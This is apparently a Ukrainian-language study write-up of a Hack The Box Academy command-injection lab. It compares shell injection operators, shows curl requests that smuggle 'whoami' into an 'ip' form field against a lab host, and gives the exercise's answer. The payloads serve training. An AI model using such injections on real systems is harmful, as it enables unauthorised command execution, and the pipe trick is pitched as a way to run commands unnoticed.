## Command Injections — Injection Operators: порівняння поведінки

**Модуль:** [Command Injections](https://academy.hackthebox.com/app/module/109)
**Секція:** [Other Injection Operators](https://academy.hackthebox.com/app/module/109/section/1034)
**Відповідь:** `|`

***

## Концепція

Кожен injection operator по-різному керує виконанням команд у shell. Розуміння різниці критично для **blind injection** (коли вивід не видно) та для **stealth** (коли треба мінімізувати шум у логах).

***

## Порівняння трьох операторів

```bash
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
TARGET="http://154.57.164.67:32497"

# New-line %0a
curl -s -X POST "$TARGET/index.php" --data "ip=127.0.0.1%0awhoami"

# Background & %26
curl -s -X POST "$TARGET/index.php" --data "ip=127.0.0.1%26whoami"

# Pipe | %7c
curl -s -X POST "$TARGET/index.php" --data "ip=127.0.0.1%7cwhoami"
```

***

## Результати і пояснення

| Оператор | URL-код | Shell виконує | Що бачимо у відповіді |
|---|---|---|---|
| `\n` (new-line) | `%0a` | `ping 127.0.0.1` потім `whoami` | ping output **+** `www-data` |
| `&` (background) | `%26` | `ping 127.0.0.1` у фоні **і** `whoami` | ping output **+** `www-data` |
| `\|` (pipe) | `%7c` | вивід `ping` → **передається як input** до `whoami` | лише `www-data` ✅ |

***

## Чому `|` показує лише вивід другої команди

```bash
# Що відбувається в shell на сервері:
ping -c 1 127.0.0.1 | whoami

# pipe передає STDOUT першої команди як STDIN другої
# whoami ігнорує STDIN → виводить лише своє ім'я
# вивід ping повністю "поглинається" pipe і не показується
```

**Це корисно коли:**
- Треба чистий вивід без "шуму" від першої команди
- Перша команда генерує великий вивід
- Потрібно непомітно виконати команду

***

## Порівняння всіх 6 операторів

| Оператор | Умова виконання | Вивід |
|---|---|---|
| `;` | Завжди | Обидві команди |
| `\n` | Завжди | Обидві команди |
| `&` | Завжди (паралельно) | Обидві команди |
| `\|` | Завжди | **Лише друга** |
| `&&` | Лише якщо перша успішна | Обидві |
| `\|\|` | Лише якщо перша провалилась | Лише друга |

***

## Відповідь

```
|
```
